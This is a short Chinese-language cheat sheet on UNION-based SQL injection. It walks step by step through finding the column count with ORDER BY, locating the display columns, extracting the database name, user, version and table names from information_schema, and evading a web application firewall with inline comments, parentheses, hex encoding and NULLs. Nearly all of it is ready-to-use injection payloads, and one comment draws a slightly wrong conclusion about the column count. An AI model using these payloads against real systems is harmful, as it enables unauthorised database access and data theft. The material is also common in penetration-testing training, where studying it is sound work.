# 联合查询注入

## 1. 确定列数

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- 报错则列数为3
```

## 2. 确定显示位

```sql
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

## 3. 获取数据

```sql
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

## 4. 绕过WAF

### 内联注释

```sql
' UNION/**/SELECT/**/1,2,3--
```

### 空格绕过

```sql
' UNION SELECT 1,2,3--
' UNION(SELECT(1),(2),(3))--
```

### 编码绕过

```sql
' UNION SELECT 1,0x61,0x62--
```

### 数字代替

```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```
